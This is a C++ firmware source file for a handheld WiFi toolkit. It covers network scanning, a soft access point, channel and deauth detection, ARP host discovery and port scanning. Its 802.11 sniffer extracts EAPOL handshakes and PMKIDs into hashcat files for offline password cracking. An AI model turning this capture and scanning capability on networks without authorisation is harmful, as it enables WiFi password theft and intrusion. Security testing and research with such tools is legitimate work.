#include "WifiMenu.h"

#include <Arduino.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <algorithm>
#include <cstdarg>
#include <cstring>
#include <new>
#include <string>
#include <vector>

#include "Config.h"
#include "Display.h"
#include "Logger.h"
#include "MenuManager.h"
#include "ModuleFlags.h"
#include "modules/mascot/Mascot.h"
#include "Navigation.h"
#include "NetGuard.h"
#include "Orbit.h"
#include "PcapTools.h"
#include "Storage.h"
#include "TextInput.h"
#include "Ui.h"
#include "WifiSetup.h"

#include <esp_netif.h>
#include <esp_netif_net_stack.h>
#include <esp_private/wifi.h>
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <lwip/netif.h>
#include <lwip/pbuf.h>
#include <lwip/tcpip.h>

#if ENABLE_MODULE_WIFI

namespace wifi {
namespace {

struct Network {
    std::string ssid;
    std::string bssid;
    int rssi = 0;
    int channel = 1;
    int auth = 0;
};

std::string shortened(const std::string& text, size_t maxLen) {
    if (text.size() <= maxLen) {
        return text;
    }
    return text.substr(0, maxLen - 1) + "~";
}

// Riempie uno scratch riusato: nei cicli di disegno evita una malloc per riga.
const std::string& shortenInto(std::string& scratch, const std::string& text,
                               size_t maxLen) {
    if (text.size() <= maxLen) {
        scratch = text;
    } else {
        scratch.assign(text, 0, maxLen - 1);
        scratch += '~';
    }
    return scratch;
}

const std::string& shortenInto(std::string& scratch, const char* text,
                               size_t maxLen) {
    scratch.assign(text != nullptr ? text : "");
    if (scratch.size() > maxLen) {
        scratch.resize(maxLen - 1);
        scratch += '~';
    }
    return scratch;
}

// Testo formattato senza allocazioni ripetute: lo std::string e' statico e
// conserva la capacita' tra una chiamata e l'altra.
void textFormat(int x, int y, uint16_t color, uint8_t font, const char* fmt,
                ...) {
    char buffer[96];
    va_list args;
    va_start(args, fmt);
    std::vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    static std::string text;
    text.assign(buffer);
    display::text(x, y, text, color, font);
}

void textCenteredFormat(int y, uint16_t color, uint8_t font, const char* fmt,
                        ...) {
    char buffer[96];
    va_list args;
    va_start(args, fmt);
    std::vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    static std::string text;
    text.assign(buffer);
    display::textCentered(y, text, color, font);
}

// Pool riusato dalle schermate di scansione: conserva la capacita' tra una
// apertura e l'altra invece di riallocare a ogni voice del menu.
std::vector<Network> g_networks;

// Spegne sempre il promiscuo nello stesso ordine, cosi' nessun percorso di
// uscita lascia la radio accesa o il callback appeso.
void stopPromiscuous() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    WiFi.mode(WIFI_OFF);
}

bool collectNetworks(std::vector<Network>& networks) {
    networks.clear();
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(120);

    WiFi.scanNetworks(true, true);

    uint32_t started = millis();
    uint32_t lastDraw = 0;
    navigation::waitRelease();

    while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            return false;
        }
        const uint32_t now = millis();
        if (now - lastDraw > 60) {
            display::clear(display::C(display::T_bg));
            orbit::sky(0, 0, display::width(), display::height(), 0x5CA4);
            display::header("Radar WiFi", "WiFi");

            // Radar: raggio rotante e blips che si accendono al passaggio.
            static const int16_t blips[] = {-18, -22, 24, -12, -6, 26, 30, 14, -28, 8, 12, -30,
                                            20, 30, -14, -6};
            const int cx = 84;
            const int cy = 74;
            orbit::radar(cx, cy, 42, static_cast<float>(now) / 620.0f, blips, 8, now);
            orbit::satellite(cx + 52, cy - 52, 9, display::C(display::T_hi),
                             display::C(display::T_sec));

            const uint32_t elapsed = now - started;
            const int rightX = 142;
            display::text(rightX, 32, "SCANSIONE", display::C(display::T_dim), 0);
            char secs[12];
            std::snprintf(secs, sizeof(secs), "%.1fs", static_cast<double>(elapsed) / 1000.0);
            display::text(rightX, 42, secs, display::C(display::T_hi), 4);
            display::text(rightX, 64, "BANDA 2.4 GHz", display::C(display::T_text), 0);
            display::text(rightX, 74, "CANALI 1-13", display::C(display::T_dim), 0);
            display::progressBar(rightX, 86, display::width() - rightX - 12, 6,
                                 std::min(1.0f, static_cast<float>(elapsed) / 6000.0f),
                                 display::C(display::T_sec));
            for (int i = 0; i < 3; ++i) {
                const bool on = ((elapsed / 220) % 3) == static_cast<uint32_t>(i);
                display::g().fillRect(rightX + i * 8, 98, 5, 5,
                                      on ? display::C(display::T_acc) : display::C(display::T_line2));
            }
            display::text(rightX + 30, 97, "SWEEP", display::C(display::T_dim), 0);
            display::footer("ESC = annulla");
            display::push();
            lastDraw = now;
        }
        delay(30);
    }

    const int count = WiFi.scanComplete();
    if (count < 0) {
        WiFi.scanDelete();
        WiFi.mode(WIFI_OFF);
        ui::message("WiFi Scanner", {"Scansione non riuscita."}, "WiFi");
        return false;
    }

    networks.reserve(count > 0 ? static_cast<size_t>(count) : 0);
    for (int i = 0; i < count; ++i) {
        networks.emplace_back();
        Network& network = networks.back();
        network.ssid = WiFi.SSID(i).c_str();
        if (network.ssid.empty()) {
            network.ssid = "(nascosta)";
        }
        network.bssid = WiFi.BSSIDstr(i).c_str();
        network.rssi = WiFi.RSSI(i);
        network.channel = WiFi.channel(i);
        network.auth = static_cast<int>(WiFi.encryptionType(i));
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);

    std::sort(networks.begin(), networks.end(),
              [](const Network& a, const Network& b) { return a.rssi > b.rssi; });
    return true;
}

int chooseIndex(const std::string& title, const std::string& parent,
                const std::vector<std::string>& labels,
                const std::string& hint) {
    if (labels.empty()) {
        return -1;
    }
    constexpr int kHeaderH = 22;
    constexpr int kFooterH = 12;
    constexpr int kRowH = 20;
    const int visible =
        std::max(1, (display::height() - kHeaderH - kFooterH) / kRowH);
    int selected = 0;
    int top = 0;
    bool upHeld = false;
    bool downHeld = false;
    uint32_t nextUp = 0;
    uint32_t nextDown = 0;

    navigation::waitRelease();
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        const uint32_t now = millis();

        if (ev.type == navigation::Event::Back) {
            navigation::waitRelease();
            return -1;
        }
        if (ev.type == navigation::Event::Select) {
            navigation::waitRelease();
            return selected;
        }
        if (ev.type == navigation::Event::Up) {
            selected = (selected + static_cast<int>(labels.size()) - 1) %
                       static_cast<int>(labels.size());
        } else if (ev.type == navigation::Event::Down) {
            selected = (selected + 1) % static_cast<int>(labels.size());
        }

        const bool upNow = navigation::pressed(';');
        const bool downNow = navigation::pressed('.');
        if (upNow && !upHeld) {
            upHeld = true;
            nextUp = now + 380;
        } else if (!upNow) {
            upHeld = false;
        }
        if (downNow && !downHeld) {
            downHeld = true;
            nextDown = now + 380;
        } else if (!downNow) {
            downHeld = false;
        }
        if (upHeld && now >= nextUp) {
            selected = (selected + static_cast<int>(labels.size()) - 1) %
                       static_cast<int>(labels.size());
            nextUp = now + 110;
        }
        if (downHeld && now >= nextDown) {
            selected = (selected + 1) % static_cast<int>(labels.size());
            nextDown = now + 110;
        }

        if (selected < top) {
            top = selected;
        } else if (selected >= top + visible) {
            top = selected - visible + 1;
        }

        display::clear();
        display::header(title, parent);
        std::string rowText;
        for (int row = 0; row < visible; ++row) {
            const int index = top + row;
            if (index >= static_cast<int>(labels.size())) {
                break;
            }
            const int y = kHeaderH + row * kRowH;
            const bool isSelected = index == selected;
            if (isSelected) {
                display::g().fillRoundRect(2, y + 1, display::width() - 6,
                                           kRowH - 2, 3, display::kAccentDark);
                display::g().fillRect(2, y + 6, 2, kRowH - 12,
                                      display::kAccent);
            }
            display::text(10, y + 6, shortenInto(rowText, labels[index], 28),
                          isSelected ? display::kWhite : display::kText, 2);
        }

        const int thumbH =
            std::max(12, visible * kRowH * visible /
                             static_cast<int>(labels.size()));
        const int trackY = kHeaderH;
        const int trackH = display::height() - kHeaderH - kFooterH;
        const int maxTop =
            std::max(1, static_cast<int>(labels.size()) - visible);
        const int thumbY =
            trackY + (trackH - thumbH) * top / maxTop;
        display::g().fillRect(display::width() - 3, trackY, 2, trackH,
                              display::kPanel);
        display::g().fillRect(display::width() - 3, thumbY, 2, thumbH,
                              display::kAccent);
        display::footer(hint);
        display::push();
        delay(16);
    }
}

void runScanner() {
    if (!collectNetworks(g_networks)) {
        return;
    }
    if (g_networks.empty()) {
        ui::message("WiFi Scanner", {"Nessuna rete trovata."}, "WiFi");
        return;
    }

    MenuManager menu("Reti WiFi", "WiFi");
    for (size_t i = 0; i < g_networks.size(); ++i) {
        const Network& network = g_networks[i];
        std::string label =
            shortened(network.ssid, 16) + "  " + std::to_string(network.rssi) +
            "dBm" + (network.auth == WIFI_AUTH_OPEN ? "  *" : "");
        menu.addItem(label, "wifi", [i] {
            const Network& copy = g_networks[i];
            ui::message("Dettagli rete",
                        {"SSID: " + copy.ssid,
                         "BSSID: " + copy.bssid,
                         "Canale: " + std::to_string(copy.channel),
                         "Sicurezza: " + std::string(wifisetup::securityName(copy.auth)),
                         "RSSI: " + std::to_string(copy.rssi) + " dBm"},
                        "WiFi");
        });
    }
    menu.setHint("ENTER=dettagli  * = aperta  ESC=indietro");
    menu.run(true);
}

void runApInfo() {
    // Funzione di rete: se la credenziale salvata esiste, riconnetti qui invece
    // di rimandare l'utente a Impostazioni > Rete WiFi.
    if (!wifisetup::ensureConnected(true, "WiFi")) {
        ui::message("AP info", {"WiFi non connesso.", "Configura la rete da",
                                "Impostazioni > Rete WiFi."},
                    "WiFi");
        return;
    }

    display::clear();
    display::header("AP info", "WiFi");
    display::text(8, 26, "SSID: " + std::string(WiFi.SSID().c_str()),
                  display::kAccent, 2);
    display::text(8, 48, "IP: " + std::string(WiFi.localIP().toString().c_str()),
                  display::kText, 0);
    display::text(8, 60,
                  "Gateway: " + std::string(WiFi.gatewayIP().toString().c_str()),
                  display::kText, 0);
    display::text(8, 72,
                  "Subnet: " + std::string(WiFi.subnetMask().toString().c_str()),
                  display::kText, 0);
    display::text(8, 84, "BSSID: " + std::string(WiFi.BSSIDstr().c_str()),
                  display::kTextDim, 0);
    display::text(8, 96, "Canale " + std::to_string(WiFi.channel()) +
                             "   RSSI " + std::to_string(WiFi.RSSI()) + " dBm",
                  display::kText, 0);
    display::footer("premi un tasto per tornare");
    display::push();

    navigation::waitRelease();
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back ||
            ev.type == navigation::Event::Select) {
            break;
        }
        delay(50);
    }
}

void runStartAp() {
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    delay(80);
    if (!WiFi.softAP("Cardputer-AP", "cardputer")) {
        WiFi.mode(WIFI_OFF);
        ui::message("Avvia AP", {"Creazione access point non riuscita."},
                    "WiFi");
        return;
    }

    const IPAddress ip = WiFi.softAPIP();
    navigation::waitRelease();
    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        display::clear();
        display::header("Access Point", "WiFi");
        display::text(8, 30, "SSID: Cardputer-AP", display::kAccent, 2);
        display::text(8, 52, "Password: cardputer", display::kText, 0);
        display::text(8, 68, "IP: " + std::string(ip.toString().c_str()),
                      display::kText, 0);
        display::text(8, 84,
                      "Client: " + std::to_string(WiFi.softAPgetStationNum()),
                      display::kText, 0);
        display::text(8, 104, "` = ferma l'access point", display::kTextDim, 0);
        display::push();
        delay(250);
    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

void runWifiOff() {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    ui::message("WiFi", {"WiFi disattivato."}, "WiFi");
}

volatile uint32_t g_channelFrames[13] = {0};
volatile uint32_t g_channelTotal = 0;

void IRAM_ATTR channelAnalyzerCb(void* buf, wifi_promiscuous_pkt_type_t) {
    auto* packet = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const int channel = packet->rx_ctrl.channel;
    if (channel >= 1 && channel <= 13) {
        g_channelFrames[channel - 1]++;
        g_channelTotal++;
    }
}

void runChannelAnalyzer() {
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous_rx_cb(channelAnalyzerCb);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        stopPromiscuous();
        ui::message("Channel Analyzer",
                    {"Modalita' promiscua non disponibile."}, "WiFi");
        return;
    }
    esp_wifi_set_promiscuous_filter(nullptr);

    for (int i = 0; i < 13; ++i) {
        g_channelFrames[i] = 0;
    }
    g_channelTotal = 0;

    constexpr uint32_t kMaxDuration = 60000;
    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    uint8_t channel = 1;

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        const uint32_t now = millis();
        if (now - lastDraw > 250) {
            uint32_t peak = 1;
            for (int i = 0; i < 13; ++i) {
                peak = std::max<uint32_t>(
                    peak, static_cast<uint32_t>(g_channelFrames[i]));
            }
            display::clear();
            display::header("Channel Analyzer", "WiFi");
            textFormat(8, 24, display::kText, 0, "Frame totali: %u",
                       static_cast<unsigned>(g_channelTotal));
            constexpr int kBarTop = 38;
            constexpr int kBarMaxH = 58;
            for (int i = 0; i < 13; ++i) {
                const int height = static_cast<int>(
                    static_cast<uint64_t>(g_channelFrames[i]) * kBarMaxH / peak);
                const int x = 8 + i * 17;
                display::g().drawRect(x, kBarTop, 13, kBarMaxH, display::kPanel);
                if (height > 0) {
                    display::g().fillRect(x + 1, kBarTop + kBarMaxH - height, 11,
                                          height,
                                          i + 1 == channel ? display::kAccent
                                                            : display::kInfo);
                }
                textFormat(x + 5, kBarTop + kBarMaxH + 2, display::kTextDim, 0,
                           "%d", i + 1);
            }
            textFormat(8, 108, display::kTextDim, 0,
                       "Canale corrente: %u   ` = esci",
                       static_cast<unsigned>(channel));
            display::push();
            lastDraw = now;
        }

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        channel = static_cast<uint8_t>(channel % 13 + 1);
        delay(250);
    }

    stopPromiscuous();
}

volatile uint32_t g_jamFrames[13] = {0};
volatile uint32_t g_jamDeauth[13] = {0};
volatile uint32_t g_jamCurrent = 0;

void IRAM_ATTR jamDetectCb(void* buf, wifi_promiscuous_pkt_type_t) {
    auto* packet = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = packet->payload;
    const int channel = packet->rx_ctrl.channel;
    if (payload == nullptr || channel < 1 || channel > 13) {
        return;
    }
    g_jamFrames[channel - 1]++;
    const uint8_t subtype = static_cast<uint8_t>(payload[0] >> 4);
    if (subtype == 0x0C || subtype == 0x0A) {
        g_jamDeauth[channel - 1]++;
        g_jamCurrent++;
    }
}

void runJamDetect() {
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous_rx_cb(jamDetectCb);
    esp_wifi_set_promiscuous_filter(&filter);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        stopPromiscuous();
        ui::message("Jam Detect",
                    {"Modalita' promiscua non disponibile."}, "WiFi");
        return;
    }

    for (int i = 0; i < 13; ++i) {
        g_jamFrames[i] = 0;
        g_jamDeauth[i] = 0;
    }
    g_jamCurrent = 0;

    constexpr uint32_t kMaxDuration = 60000;
    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    uint8_t channel = 1;
    bool alarm = false;

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        const uint32_t before = g_jamCurrent;
        delay(400);
        const uint32_t delta = g_jamCurrent - before;
        alarm = delta >= 12;

        const uint32_t now = millis();
        if (now - lastDraw > 250) {
            display::clear();
            display::header("Jam Detect", "WiFi");
            display::text(8, 26,
                          alarm ? "DEAUTH RILEVATO" : "Nessun jam evidente",
                          alarm ? display::kDanger : display::kInfo, 2);
            textFormat(8, 50, display::kText, 0,
                       "Canale %u: %u deauth/400ms",
                       static_cast<unsigned>(channel),
                       static_cast<unsigned>(delta));
            textFormat(8, 66, display::kTextDim, 0, "Totale deauth: %u",
                       static_cast<unsigned>(g_jamCurrent));
            for (int i = 0; i < 13; ++i) {
                const int x = 8 + i * 17;
                const uint32_t count = g_jamDeauth[i];
                const int height = static_cast<int>(std::min<uint32_t>(56, count));
                display::g().drawRect(x, 84, 13, 24, display::kPanel);
                if (height > 0) {
                    display::g().fillRect(x + 1, 107 - height, 11, height,
                                          count > 0 ? display::kDanger
                                                    : display::kPanel);
                }
                textFormat(x + 5, 110, display::kTextDim, 0, "%d", i + 1);
            }
            display::footer("ESC = esci");
            display::push();
            lastDraw = now;
        }

        channel = static_cast<uint8_t>(channel % 13 + 1);
    }

    stopPromiscuous();
}

constexpr int kSnifferSlots = 8;
constexpr size_t kSnifferMax = 1600;

struct SnifferSlot {
    uint16_t length;
    uint8_t data[kSnifferMax];
};

// Anello su heap: 12,8 KB occupati solo mentre lo sniffer e' aperto.
SnifferSlot* g_sniffSlots = nullptr;
volatile int g_sniffHead = 0;
volatile int g_sniffTail = 0;
volatile uint32_t g_sniffDropped = 0;
volatile uint32_t g_sniffTotal = 0;
portMUX_TYPE g_sniffMux = portMUX_INITIALIZER_UNLOCKED;

void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t) {
    auto* packet = static_cast<wifi_promiscuous_pkt_t*>(buf);
    uint16_t length = packet->rx_ctrl.sig_len;
    if (length > kSnifferMax) {
        length = kSnifferMax;
    }
    if (length < 10 || g_sniffSlots == nullptr) {
        return;
    }
    // sig_len comprende l'FCS (4 byte): il linktype 105 del PCAP non lo prevede,
    // e lasciarlo dentro produce frame malformati in Wireshark.
    length = static_cast<uint16_t>(length - 4);
    portENTER_CRITICAL_ISR(&g_sniffMux);
    const int next = (g_sniffHead + 1) % kSnifferSlots;
    if (next == g_sniffTail) {
        g_sniffDropped++;
        portEXIT_CRITICAL_ISR(&g_sniffMux);
        return;
    }
    g_sniffSlots[g_sniffHead].length = length;
    memcpy(g_sniffSlots[g_sniffHead].data, packet->payload, length);
    g_sniffHead = next;
    g_sniffTotal++;
    portEXIT_CRITICAL_ISR(&g_sniffMux);
}

struct PcapGlobalHeader {
    uint32_t magic;
    uint16_t versionMajor;
    uint16_t versionMinor;
    int32_t thisZone;
    uint32_t sigFigs;
    uint32_t snapLen;
    uint32_t network;
} __attribute__((packed));

struct PcapPacketHeader {
    uint32_t tsSec;
    uint32_t tsUsec;
    uint32_t inclLen;
    uint32_t origLen;
} __attribute__((packed));

void runSniffer() {
    if (!storage::hasSD()) {
        ui::message("Sniffer", {"Serve una microSD per salvare il PCAP."},
                    "WiFi");
        return;
    }

    g_sniffSlots = new (std::nothrow) SnifferSlot[kSnifferSlots];
    if (g_sniffSlots == nullptr) {
        ui::message("Sniffer", {"Memoria insufficiente per il buffer."}, "WiFi");
        return;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    // Azzera l'anello PRIMA di registrare il callback e accendere il promiscuo:
    // un frame in arrivo fra le due operazioni userebbe indici del giro
    // precedente su uno stato gia' ripulito.
    portENTER_CRITICAL(&g_sniffMux);
    g_sniffHead = 0;
    g_sniffTail = 0;
    g_sniffDropped = 0;
    g_sniffTotal = 0;
    portEXIT_CRITICAL(&g_sniffMux);

    esp_wifi_set_promiscuous_rx_cb(snifferCb);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        stopPromiscuous();
        delete[] g_sniffSlots;
        g_sniffSlots = nullptr;
        ui::message("Sniffer", {"Modalita' promiscua non disponibile."},
                    "WiFi");
        return;
    }
    esp_wifi_set_promiscuous_filter(nullptr);

    // Estrazione live: gli EAPOL vengono copiati dal ring e analizzati qui sul
    // task principale, mai nel callback ISR. Collettore statico: l'unico buffer
    // interno (~3 KB) viene allocato una volta e riusato a ogni sessione,
    // invece di malloc/free a ogni apertura dello sniffer.
    static pcaptools::LiveCollector live;
    live.reset();

    storage::mkdir("/captures", true);
    // Nome univoco: FILE_WRITE tronca, quindi un nome fisso cancellerebbe la
    // cattura precedente a ogni sessione.
    const uint32_t captureId = esp_random();
    char capturePath[48];
    char hcPath[48];
    std::snprintf(capturePath, sizeof(capturePath), "/captures/wifi_%08lX.pcap",
                  static_cast<unsigned long>(captureId));
    std::snprintf(hcPath, sizeof(hcPath), "/captures/wifi_%08lX.hc22000",
                  static_cast<unsigned long>(captureId));
    File file = storage::openWrite(capturePath, true);
    if (!file) {
        stopPromiscuous();
        delete[] g_sniffSlots;
        g_sniffSlots = nullptr;
        ui::message("Sniffer", {"Impossibile creare il file PCAP."}, "WiFi");
        return;
    }

    PcapGlobalHeader global = {};
    global.magic = 0xA1B2C3D4;
    global.versionMajor = 2;
    global.versionMinor = 4;
    global.snapLen = kSnifferMax;
    global.network = 105;
    file.write(reinterpret_cast<const uint8_t*>(&global), sizeof(global));

    constexpr uint32_t kMaxDuration = 120000;
    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    uint32_t written = 0;
    uint32_t sinceFlush = 0;
    uint32_t lastFlush = millis();
    bool writeError = false;
    uint8_t channel = 1;

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }

        // Drenaggio limitato: con la scheda SD lenta o un canale trafficato il
        // produttore riempie l'anello piu' in fretta di quanto lo si svuoti, e
        // senza un limite il ciclo esterno (tasti, cambio canale, disegno) non
        // verrebbe mai raggiunto.
        for (int drain = 0; drain < kSnifferSlots; ++drain) {
            static SnifferSlot slot;  // 1,6 KB in BSS, non sullo stack del loop
            bool have = false;
            portENTER_CRITICAL(&g_sniffMux);
            if (g_sniffTail != g_sniffHead) {
                slot.length = g_sniffSlots[g_sniffTail].length;
                memcpy(slot.data, g_sniffSlots[g_sniffTail].data, slot.length);
                g_sniffTail = (g_sniffTail + 1) % kSnifferSlots;
                have = true;
            }
            portEXIT_CRITICAL(&g_sniffMux);
            if (!have) {
                break;
            }
            // Analisi leggera sul task principale: copia solo i frame utili
            // (EAPOL, beacon/probe response) nella lista in RAM.
            live.feed(slot.data, slot.length);
            PcapPacketHeader header = {};
            const uint32_t now = millis();
            header.tsSec = now / 1000;
            header.tsUsec = (now % 1000) * 1000;
            header.inclLen = slot.length;
            header.origLen = slot.length;
            if (file.write(reinterpret_cast<const uint8_t*>(&header),
                           sizeof(header)) != sizeof(header) ||
                file.write(slot.data, slot.length) != slot.length) {
                logger::warn("Sniffer: scrittura PCAP fallita (SD piena?)");
                writeError = true;
                break;
            }
            ++written;
            ++sinceFlush;
        }

        if (writeError) {
            // Senza SD non ha senso continuare a catturare: chiudi il file e
            // avvisa, invece di girare a vuoto perdendo frame.
            break;
        }
        // Flush periodico: un'interruzione di corrente perde al massimo ~1 s
        // di cattura invece dell'intera sessione.
        if (sinceFlush >= 64 || (millis() - lastFlush) >= 1000) {
            file.flush();
            sinceFlush = 0;
            lastFlush = millis();
        }

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        channel = static_cast<uint8_t>(channel % 13 + 1);

        const uint32_t now = millis();
        if (now - lastDraw > 200) {
            display::clear();
            display::header("Sniffer 802.11", "WiFi");
            textFormat(8, 28, display::kTextDim, 0, "File: %s", capturePath);
            textFormat(8, 46, display::kAccent, 2, "Frame: %u",
                       static_cast<unsigned>(g_sniffTotal));
            textFormat(8, 70, display::kText, 0, "Scritti: %u",
                       static_cast<unsigned>(written));
            textFormat(8, 84, display::kTextDim, 0, "Persi: %u",
                       static_cast<unsigned>(g_sniffDropped));
            textFormat(8, 100, display::kTextDim, 0,
                       "Canale %u   ` = interrompi",
                       static_cast<unsigned>(channel));
            textFormat(8, 114, display::kTextDim, 0, "Cand. hc22000: %u",
                       static_cast<unsigned>(live.entries()));
            display::push();
            lastDraw = now;
        }
        delay(30);
    }

    file.flush();
    file.close();
    stopPromiscuous();
    delete[] g_sniffSlots;
    g_sniffSlots = nullptr;
    logger::info("Sniffer terminato: %u frame in %s",
                 static_cast<unsigned>(written), capturePath);

    // Scrittura finale dell'hashcat 22000 con quanto raccolto in RAM.
    // Il file viene creato anche se non ci sono hash (in tal caso e' vuoto),
    // cosi' ogni sessione ha il suo output accanto al PCAP.
    pcaptools::HcStats hcStats;
    if (live.writeFile(hcPath, true, &hcStats)) {
        logger::info("Sniffer: hc22000 %u PMKID, %u handshake, %u senza SSID in %s",
                     static_cast<unsigned>(hcStats.pmkid),
                     static_cast<unsigned>(hcStats.handshakes),
                     static_cast<unsigned>(hcStats.skippedNoEssid), hcPath);
    } else {
        logger::warn("Sniffer: scrittura hc22000 non riuscita");
    }
    if (writeError) {
        ui::message("Sniffer",
                    {"!Scrittura sulla microSD non riuscita.",
                     "Cattura interrotta. Controlla spazio", "e stato della card."},
                    "WiFi");
    } else if (hcStats.skippedNoEssid > 0) {
        ui::message("Sniffer",
                    {"hc22000: " + std::to_string(hcStats.skippedNoEssid) +
                         " hash senza SSID",
                     "esclusi: hashcat non puo'", "verificarli."},
                    "WiFi");
    }
}

struct HostEntry {
    IPAddress ip;
    uint8_t mac[6];
};

std::string hostMac(const uint8_t mac[6]) {
    char text[18];
    std::snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return text;
}

void hostMacInto(char out[18], const uint8_t mac[6]) {
    std::snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1],
                  mac[2], mac[3], mac[4], mac[5]);
}

void readArpHosts(struct netif* netif, std::vector<HostEntry>& hosts) {
    for (size_t i = 0;; ++i) {
        ip4_addr_t* address = nullptr;
        struct netif* found = nullptr;
        struct eth_addr* mac = nullptr;
        if (!etharp_get_entry(i, &address, &found, &mac)) {
            break;
        }
        if (address == nullptr || mac == nullptr) {
            continue;
        }
        const IPAddress ip(address->addr);
        bool known = false;
        for (const auto& host : hosts) {
            if (host.ip == ip) {
                known = true;
                break;
            }
        }
        if (known) {
            continue;
        }
        HostEntry host;
        host.ip = ip;
        memcpy(host.mac, mac->addr, 6);
        hosts.push_back(host);
    }
}

void runPortScan(const HostEntry& host) {
    static const uint16_t kPorts[] = {
        21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
        554, 1883, 3306, 3389, 5000, 8080, 8443,
    };
    std::vector<uint16_t> open;
    const size_t total = sizeof(kPorts) / sizeof(kPorts[0]);
    open.reserve(total);
    const std::string hostLine =
        std::string(host.ip.toString().c_str()) + "  " + hostMac(host.mac);

    navigation::waitRelease();
    for (size_t i = 0; i < total; ++i) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        WiFiClient client;
        client.setTimeout(120);
        if (client.connect(host.ip, kPorts[i])) {
            open.push_back(kPorts[i]);
            client.stop();
        }
        display::clear();
        display::header("Port scan", "Scan Hosts");
        display::text(8, 30, hostLine, display::kAccent, 0);
        textFormat(8, 50, display::kText, 0, "Porta %u  (%u/%u)",
                   static_cast<unsigned>(kPorts[i]),
                   static_cast<unsigned>(i + 1),
                   static_cast<unsigned>(total));
        display::progressBar(8, 70, 180, 8,
                             static_cast<float>(i + 1) / total,
                             display::kInfo);
        display::footer("ESC = interrompi");
        display::push();
    }

    std::string ports = "Nessuna porta aperta.";
    if (!open.empty()) {
        ports.clear();
        for (size_t i = 0; i < open.size(); ++i) {
            if (i > 0) {
                ports += ", ";
            }
            ports += std::to_string(open[i]);
        }
    }
    ui::message("Port scan",
                {"Host: " + hostLine,
                 "MAC: " + hostMac(host.mac), "Porte aperte:", ports},
                "Scan Hosts");
}

void runScanHosts() {
    if (!wifisetup::ensureConnected(true, "WiFi")) {
        ui::message("Scan Hosts",
                    {"WiFi non connesso.", "Connetti la rete da",
                     "Impostazioni > Rete WiFi."},
                    "WiFi");
        return;
    }
    if (WiFi.status() != WL_CONNECTED) {
        ui::message("Scan Hosts",
                    {"WiFi non connesso.", "Connetti la rete da",
                     "Impostazioni > Rete WiFi."},
                    "WiFi");
        return;
    }

    esp_netif_t* espNetif =
        esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (espNetif == nullptr) {
        ui::message("Scan Hosts", {"Interfaccia WiFi non disponibile."},
                    "WiFi");
        return;
    }
    struct netif* netif =
        static_cast<struct netif*>(esp_netif_get_netif_impl(espNetif));
    esp_netif_ip_info_t info = {};
    if (netif == nullptr || esp_netif_get_ip_info(espNetif, &info) != ESP_OK ||
        info.ip.addr == 0) {
        ui::message("Scan Hosts", {"IP non assegnato."}, "WiFi");
        return;
    }

    const uint32_t own = ntohl(info.ip.addr);
    const IPAddress gatewayIp(info.gw.addr);
    const uint32_t mask = ntohl(info.netmask.addr);
    uint32_t first = (own & mask) + 1;
    uint32_t last = (own | ~mask) - 1;
    if (last > first && last - first > 254) {
        first = (own & 0xFFFFFF00u) | 1;
